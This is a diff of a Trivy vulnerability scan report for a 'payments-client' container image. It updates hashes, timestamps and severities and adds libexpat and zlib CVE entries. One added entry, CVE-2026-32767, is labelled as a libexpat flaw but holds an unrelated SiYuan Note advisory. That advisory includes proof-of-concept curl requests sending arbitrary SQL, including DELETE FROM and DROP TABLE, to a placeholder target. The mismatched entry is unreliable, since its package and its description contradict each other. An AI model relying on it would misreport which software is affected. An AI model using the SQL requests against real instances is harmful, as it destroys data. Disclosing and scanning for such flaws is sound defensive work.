@@ -3,9 +3,9 @@
   "Trivy": {
     "Version": "0.69.3"
   },
-  "ReportID": "019ceedd-cfaf-72fe-a941-7cd97bd6d834",
-  "CreatedAt": "2026-03-15T00:20:39.983197308Z",
-  "ArtifactID": "sha256:44ce20955c55c0daeae35d949d9463fe4998843c30f6e74529887f7c6b36508e",
+  "ReportID": "019d12e9-13bb-7c10-909d-d6b94f20fcdc",
+  "CreatedAt": "2026-03-22T00:19:18.07579238Z",
+  "ArtifactID": "sha256:87ce51381087523b5fd8792d502303ebafbed473d8d10fa672a143bab9412113",
   "ArtifactName": "payments-client",
   "ArtifactType": "container_image",
   "Metadata": {
@@ -14,7 +14,7 @@
       "Family": "alpine",
       "Name": "3.23.3"
     },
-    "ImageID": "sha256:6c986f853dbb770fda23bc54b0f66561754fcd2b51545d47f27da45b76b56e5b",
+    "ImageID": "sha256:cf632eaefe85072db5b4f58392fecc4f9c044a96012209b4b5f57fe5e3804355",
     "DiffIDs": [
       "sha256:989e799e634906e94dc9a5ee2ee26fc92ad260522990f26e707861a5f52bf64e",
       "sha256:5bb518009c83d498f71263ffc016f9f447251adbd2529289ead569af6f8e70e6",
@@ -24,8 +24,8 @@
       "sha256:04297a721e7f464d1c7e35294c019010fd7fd20ec1b3891ee207e7dd39c4fcff",
       "sha256:5693fac86db4876970e0bbdd63d9b50ed650051457225e9377d8b72a35aba7bd",
       "sha256:d408059e7553020f3caf3f88b3d1f012c7a0528299b077a5b8ee2ea70e29f109",
-      "sha256:1ba46af11d79cf14947820afdc0d87f8ccf24c975817ab906ae6f40482133b7e",
-      "sha256:505bb9bb20bd8566345b8ff9ee09357854a34ce68afc35de8bdf2b87bd059111"
+      "sha256:8f24bf34aa7f425e3ec9e29656d0ef5e9e0833a5d4e4299ae402f07dbf2dd392",
+      "sha256:8764b643e70186062db703cfcc5cdacd4ce4894db2891adc48a85b9837b62cc4"
     ],
     "RepoTags": [
       "payments-client:latest"
@@ -33,7 +33,7 @@
     "Reference": "payments-client:latest",
     "ImageConfig": {
       "architecture": "amd64",
-      "created": "2026-03-15T00:20:38.752735438Z",
+      "created": "2026-03-22T00:19:16.058471804Z",
       "history": [
         {
           "created": "2026-01-28T01:18:04Z",
@@ -148,23 +148,23 @@
           "comment": "buildkit.dockerfile.v0"
         },
         {
-          "created": "2026-03-15T00:20:33Z",
+          "created": "2026-03-22T00:19:10Z",
           "created_by": "COPY nginx.conf /etc/nginx/conf.d/default.conf # buildkit",
           "comment": "buildkit.dockerfile.v0"
         },
         {
-          "created": "2026-03-15T00:20:38Z",
+          "created": "2026-03-22T00:19:16Z",
           "created_by": "COPY /app/dist /usr/share/nginx/html # buildkit",
           "comment": "buildkit.dockerfile.v0"
         },
         {
-          "created": "2026-03-15T00:20:38Z",
+          "created": "2026-03-22T00:19:16Z",
           "created_by": "EXPOSE map[443/tcp:{} 80/tcp:{}]",
           "comment": "buildkit.dockerfile.v0",
           "empty_layer": true
         },
         {
-          "created": "2026-03-15T00:20:38Z",
+          "created": "2026-03-22T00:19:16Z",
           "created_by": "CMD [\"nginx\" \"-g\" \"daemon off;\"]",
           "comment": "buildkit.dockerfile.v0",
           "empty_layer": true
@@ -182,8 +182,8 @@
           "sha256:04297a721e7f464d1c7e35294c019010fd7fd20ec1b3891ee207e7dd39c4fcff",
           "sha256:5693fac86db4876970e0bbdd63d9b50ed650051457225e9377d8b72a35aba7bd",
           "sha256:d408059e7553020f3caf3f88b3d1f012c7a0528299b077a5b8ee2ea70e29f109",
-          "sha256:1ba46af11d79cf14947820afdc0d87f8ccf24c975817ab906ae6f40482133b7e",
-          "sha256:505bb9bb20bd8566345b8ff9ee09357854a34ce68afc35de8bdf2b87bd059111"
+          "sha256:8f24bf34aa7f425e3ec9e29656d0ef5e9e0833a5d4e4299ae402f07dbf2dd392",
+          "sha256:8764b643e70186062db703cfcc5cdacd4ce4894db2891adc48a85b9837b62cc4"
         ]
       },
       "config": {
@@ -251,11 +251,11 @@
       },
       {
         "Size": 4608,
-        "DiffID": "sha256:1ba46af11d79cf14947820afdc0d87f8ccf24c975817ab906ae6f40482133b7e"
+        "DiffID": "sha256:8f24bf34aa7f425e3ec9e29656d0ef5e9e0833a5d4e4299ae402f07dbf2dd392"
       },
       {
         "Size": 250880,
-        "DiffID": "sha256:505bb9bb20bd8566345b8ff9ee09357854a34ce68afc35de8bdf2b87bd059111"
+        "DiffID": "sha256:8764b643e70186062db703cfcc5cdacd4ce4894db2891adc48a85b9837b62cc4"
       }
     ]
   },
@@ -3630,6 +3630,150 @@
       ],
       "Vulnerabilities": [
         {
+          "VulnerabilityID": "CVE-2026-32767",
+          "PkgID": "libexpat@2.7.4-r0",
+          "PkgName": "libexpat",
+          "PkgIdentifier": {
+            "PURL": "pkg:apk/alpine/libexpat@2.7.4-r0?arch=x86_64\u0026distro=3.23.3",
+            "UID": "3115e0db978d70f4"
+          },
+          "InstalledVersion": "2.7.4-r0",
+          "FixedVersion": "2.7.5-r0",
+          "Status": "fixed",
+          "Layer": {
+            "DiffID": "sha256:d408059e7553020f3caf3f88b3d1f012c7a0528299b077a5b8ee2ea70e29f109"
+          },
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-32767",
+          "DataSource": {
+            "ID": "alpine",
+            "Name": "Alpine Secdb",
+            "URL": "https://secdb.alpinelinux.org/"
+          },
+          "Fingerprint": "sha256:d560a9855c87ed55cf7d279e15612564597ce94bcd4f945434973ef2823e09fa",
+          "Title": "SiYuan: Authorization Bypass Allows Arbitrary SQL Execution via Search API",
+          "Description": "## Summary\n\nSiYuan Note v3.6.0 (and likely prior versions) contains an authorization bypass vulnerability in the `/api/search/fullTextSearchBlock` endpoint. When the `method` parameter is set to `2`, the endpoint passes user-supplied input directly as a raw SQL statement to the underlying SQLite database without any authorization or read-only checks. This allows any authenticated user — including those with the `Reader` role — to execute arbitrary SQL statements (SELECT, DELETE, UPDATE, DROP TABLE, etc.) against the application's database.\n\nThis is inconsistent with the application's own security model: the dedicated SQL endpoint (`/api/query/sql`) correctly requires both `CheckAdminRole` and `CheckReadonly` middleware, but the search endpoint bypasses these controls entirely.\n\n## Root Cause Analysis\n\n### The Vulnerable Endpoint\n\n**File:** `kernel/api/router.go`, line 188\n\n```go\nginServer.Handle(\"POST\", \"/api/search/fullTextSearchBlock\", model.CheckAuth, fullTextSearchBlock)\n```\n\nThis endpoint only applies `model.CheckAuth`, which permits **any** authenticated role (Administrator, Editor, or Reader).\n\n### The Properly Protected Endpoint (for comparison)\n\n**File:** `kernel/api/router.go`, line 177\n\n```go\nginServer.Handle(\"POST\", \"/api/query/sql\", model.CheckAuth, model.CheckAdminRole, model.CheckReadonly, SQL)\n```\n\nThis endpoint correctly chains `CheckAdminRole` and `CheckReadonly`, restricting SQL execution to administrators in read-write mode.\n\n### The Vulnerable Code Path\n\n**File:** `kernel/api/search.go`, lines 389-411\n\n```go\nfunc fullTextSearchBlock(c *gin.Context) {\n    // ...\n    page, pageSize, query, paths, boxes, types, method, orderBy, groupBy := parseSearchBlockArgs(arg)\n    blocks, matchedBlockCount, matchedRootCount, pageCount, docMode :=\n        model.FullTextSearchBlock(query, boxes, paths, types, method, orderBy, groupBy, page, pageSize)\n    // ...\n}\n```\n\n**File:** `kernel/model/search.go`, lines 1205-1206\n\n```go\ncase 2: // SQL\n    blocks, matchedBlockCount, matchedRootCount = searchBySQL(query, beforeLen, page, pageSize)\n```\n\nWhen `method=2`, the raw `query` string is passed directly to `searchBySQL()`.\n\n**File:** `kernel/model/search.go`, lines 1460-1462\n\n```go\nfunc searchBySQL(stmt string, beforeLen, page, pageSize int) (ret []*Block, ...) {\n    stmt = strings.TrimSpace(stmt)\n    blocks := sql.SelectBlocksRawStmt(stmt, page, pageSize)\n```\n\n**File:** `kernel/sql/block_query.go`, lines 566-569, 713-714\n\n```go\nfunc SelectBlocksRawStmt(stmt string, page, limit int) (ret []*Block) {\n    parsedStmt, err := sqlparser.Parse(stmt)\n    if err != nil {\n        return selectBlocksRawStmt(stmt, limit)  // Falls through to raw execution\n    }\n    // ...\n}\n\nfunc selectBlocksRawStmt(stmt string, limit int) (ret []*Block) {\n    rows, err := query(stmt)  // Executes arbitrary SQL\n    // ...\n}\n```\n\n**File:** `kernel/sql/database.go`, lines 1327-1337\n\n```go\nfunc query(query string, args ...interface{}) (*sql.Rows, error) {\n    // ...\n    return db.Query(query, args...)  // Go's database/sql db.Query — executes ANY SQL\n}\n```\n\nGo's `database/sql` `db.Query()` will execute any SQL statement, including `DELETE`, `UPDATE`, `DROP TABLE`, `INSERT`, etc. The returned `*sql.Rows` will simply be empty for non-SELECT statements, but the destructive operation is still executed.\n\n### Authorization Model\n\n**File:** `kernel/model/session.go`, lines 201-210\n\n```go\nfunc CheckAuth(c *gin.Context) {\n    // Already authenticated via JWT\n    if role := GetGinContextRole(c); IsValidRole(role, []Role{\n        RoleAdministrator,\n        RoleEditor,\n        RoleReader,       // \u003c-- Reader role passes CheckAuth\n    }) {\n        c.Next()\n        return\n    }\n    // ...\n}\n```\n\n**File:** `kernel/model/session.go`, lines 380-386\n\n```go\nfunc CheckAdminRole(c *gin.Context) {\n    if IsAdminRoleContext(c) {\n        c.Next()\n    } else {\n        c.AbortWithStatus(http.StatusForbidden)  // \u003c-- This check is MISSING on the search endpoint\n    }\n}\n```\n\n## Proof of Concept\n\n### Prerequisites\n- SiYuan instance accessible over the network (e.g., Docker deployment)\n- Valid authentication as any user role (including `Reader`)\n\n### Steps to Reproduce\n\n1. Authenticate to SiYuan and obtain a valid session cookie or API token.\n\n2. **Read all data (confidentiality breach):**\n```bash\ncurl -X POST http://\u003ctarget\u003e:6806/api/search/fullTextSearchBlock \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Token \u003creader_token\u003e\" \\\n  -d '{\"method\": 2, \"query\": \"SELECT * FROM blocks LIMIT 100\"}'\n```\n\n3. **Delete all blocks (integrity/availability breach):**\n```bash\ncurl -X POST http://\u003ctarget\u003e:6806/api/search/fullTextSearchBlock \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Token \u003creader_token\u003e\" \\\n  -d '{\"method\": 2, \"query\": \"DELETE FROM blocks\"}'\n```\n\n4. **Drop tables (availability breach):**\n```bash\ncurl -X POST http://\u003ctarget\u003e:6806/api/search/fullTextSearchBlock \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Token \u003creader_token\u003e\" \\\n  -d '{\"method\": 2, \"query\": \"DROP TABLE blocks\"}'\n```\n\n5. **Compare with the properly protected endpoint** (should return HTTP 403 for Reader role):\n```bash\ncurl -X POST http://\u003ctarget\u003e:6806/api/query/sql \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Token \u003creader_token\u003e\" \\\n  -d '{\"stmt\": \"SELECT * FROM blocks LIMIT 10\"}'\n```\n\n### Expected Behavior\nThe search endpoint should reject SQL execution for non-admin users, or at minimum enforce read-only access, consistent with `/api/query/sql`.\n\n### Actual Behavior\nAny authenticated user (including Reader role) can execute arbitrary SQL including destructive operations.\n\n## Impact\n\nIn a multi-user deployment (e.g., Docker with published access, or any network-accessible instance with access authorization code):\n\n- **Confidentiality:** A Reader-role user can read all data in the SQLite database, including blocks, assets, references, and configuration data they should not have access to.\n- **Integrity:** A Reader-role user can modify or delete any data in the database, despite having read-only access by design.\n- **Availability:** A Reader-role user can drop tables or corrupt the database, rendering the application unusable.\n\n## Suggested Fix\n\nAdd `CheckAdminRole` and `CheckReadonly` middleware to the search endpoint, or add explicit validation that only SELECT statements are accepted when `method=2`:\n\n**Option A — Restrict method=2 to admin (recommended):**\n\nIn `kernel/api/search.go`, add a role check when `method=2`:\n\n```go\nfunc fullTextSearchBlock(c *gin.Context) {\n    // ...\n    page, pageSize, query, paths, boxes, types, method, orderBy, groupBy := parseSearchBlockArgs(arg)\n\n    // SQL mode requires admin privileges, consistent with /api/query/sql\n    if method == 2 \u0026\u0026 !model.IsAdminRoleContext(c) {\n        ret.Code = -1\n        ret.Msg = \"SQL search requires administrator privileges\"\n        return\n    }\n    // ...\n}\n```\n\n**Option B — Enforce SELECT-only for non-admin users:**\n\nValidate the parsed SQL to ensure only SELECT statements are executed when the user is not an administrator.",
+          "Severity": "CRITICAL",
+          "VendorSeverity": {
+            "ghsa": 4
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+              "V3Score": 9.8
+            }
+          },
+          "References": [
+            "https://github.com/siyuan-note/siyuan",
+            "https://github.com/siyuan-note/siyuan/security/advisories/GHSA-j7wh-x834-p3r7"
+          ]
+        },
+        {
+          "VulnerabilityID": "CVE-2026-32777",
+          "PkgID": "libexpat@2.7.4-r0",
+          "PkgName": "libexpat",
+          "PkgIdentifier": {
+            "PURL": "pkg:apk/alpine/libexpat@2.7.4-r0?arch=x86_64\u0026distro=3.23.3",
+            "UID": "3115e0db978d70f4"
+          },
+          "InstalledVersion": "2.7.4-r0",
+          "FixedVersion": "2.7.5-r0",
+          "Status": "fixed",
+          "Layer": {
+            "DiffID": "sha256:d408059e7553020f3caf3f88b3d1f012c7a0528299b077a5b8ee2ea70e29f109"
+          },
+          "SeveritySource": "nvd",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-32777",
+          "DataSource": {
+            "ID": "alpine",
+            "Name": "Alpine Secdb",
+            "URL": "https://secdb.alpinelinux.org/"
+          },
+          "Fingerprint": "sha256:a6079408f0055caa11c0b841270dc4e07d0c3cb9facc0c20b30dbbfbb29cfe04",
+          "Title": "libexpat: libexpat: Denial of Service via infinite loop in DTD content parsing",
+          "Description": "libexpat before 2.7.5 allows an infinite loop while parsing DTD content.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-835"
+          ],
+          "VendorSeverity": {
+            "nvd": 2,
+            "redhat": 2
+          },
+          "CVSS": {
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 5.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+              "V3Score": 4
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-32777",
+            "https://github.com/libexpat/libexpat/issues/1161",
+            "https://github.com/libexpat/libexpat/pull/1159",
+            "https://github.com/libexpat/libexpat/pull/1162",
+            "https://issues.oss-fuzz.com/issues/486993411",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-32777",
+            "https://www.cve.org/CVERecord?id=CVE-2026-32777"
+          ],
+          "PublishedDate": "2026-03-16T14:19:44.78Z",
+          "LastModifiedDate": "2026-03-17T15:52:34.357Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-32778",
+          "PkgID": "libexpat@2.7.4-r0",
+          "PkgName": "libexpat",
+          "PkgIdentifier": {
+            "PURL": "pkg:apk/alpine/libexpat@2.7.4-r0?arch=x86_64\u0026distro=3.23.3",
+            "UID": "3115e0db978d70f4"
+          },
+          "InstalledVersion": "2.7.4-r0",
+          "FixedVersion": "2.7.5-r0",
+          "Status": "fixed",
+          "Layer": {
+            "DiffID": "sha256:d408059e7553020f3caf3f88b3d1f012c7a0528299b077a5b8ee2ea70e29f109"
+          },
+          "SeveritySource": "nvd",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-32778",
+          "DataSource": {
+            "ID": "alpine",
+            "Name": "Alpine Secdb",
+            "URL": "https://secdb.alpinelinux.org/"
+          },
+          "Fingerprint": "sha256:3a7e44729435c5ad5d18850a1f5ec10cc5b0450252145a6363d28af48a85cd15",
+          "Title": "libexpat: libexpat: Denial of Service via NULL pointer dereference after out-of-memory condition",
+          "Description": "libexpat before 2.7.5 allows a NULL pointer dereference in the function setContext on retry after an earlier ouf-of-memory condition.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-476"
+          ],
+          "VendorSeverity": {
+            "nvd": 2,
+            "redhat": 2
+          },
+          "CVSS": {
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 5.5
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 5.1
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-32778",
+            "https://github.com/libexpat/libexpat/pull/1159",
+            "https://github.com/libexpat/libexpat/pull/1163",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-32778",
+            "https://www.cve.org/CVERecord?id=CVE-2026-32778"
+          ],
+          "PublishedDate": "2026-03-16T14:19:44.97Z",
+          "LastModifiedDate": "2026-03-17T15:52:53.16Z"
+        },
+        {
           "VulnerabilityID": "CVE-2026-22184",
           "PkgID": "zlib@1.3.1-r2",
           "PkgName": "zlib",
@@ -3650,21 +3794,21 @@
             "Name": "Alpine Secdb",
             "URL": "https://secdb.alpinelinux.org/"
           },
-          "Fingerprint": "sha256:0d709c1ea7d416668432152f7afd6e6fcfe68ed7befe462560bb46f2e72c4055",
+          "Fingerprint": "sha256:4af50ca1400f979a599bfd018cedaa6bbbdef2d531d31bd5194c672ec48c306b",
           "Title": "zlib: zlib: Arbitrary code execution via buffer overflow in untgz utility",
           "Description": "zlib versions up to and including 1.3.1.2 include a global buffer overflow in the untgz utility located under contrib/untgz. The vulnerability is limited to the standalone demonstration utility and does not affect the core zlib compression library. The flaw occurs when a user executes the untgz command with an excessively long archive name supplied via the command line, leading to an out-of-bounds write in a fixed-size global buffer.",
-          "Severity": "CRITICAL",
+          "Severity": "HIGH",
           "CweIDs": [
             "CWE-787"
           ],
           "VendorSeverity": {
-            "nvd": 4,
+            "nvd": 3,
             "redhat": 3
           },
           "CVSS": {
             "nvd": {
-              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
-              "V3Score": 9.8
+              "V3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+              "V3Score": 7.8
             },
             "redhat": {
               "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H",
@@ -3682,7 +3826,7 @@
             "https://zlib.net/"
           ],
           "PublishedDate": "2026-01-07T21:16:01.563Z",
-          "LastModifiedDate": "2026-01-15T14:16:27.047Z"
+          "LastModifiedDate": "2026-03-18T16:26:31.14Z"
         },
         {
           "VulnerabilityID": "CVE-2026-27171",
@@ -3705,7 +3849,7 @@
             "Name": "Alpine Secdb",
             "URL": "https://secdb.alpinelinux.org/"
           },
-          "Fingerprint": "sha256:15124953bcb2895675fb13d7aafd359cb036fc57bb2b484c2ff1b0c1d417fc93",
+          "Fingerprint": "sha256:0b9b1c62401e4fe8d58c6bb5aad8850f6f9798d58bfa11743641ba0efd15aa3e",
           "Title": "zlib: zlib: Denial of Service via infinite loop in CRC32 combine functions",
           "Description": "zlib before 1.3.2 allows CPU consumption via crc32_combine64 and crc32_combine_gen64 because x2nmodp can do right shifts within a loop that has no termination condition.",
           "Severity": "MEDIUM",
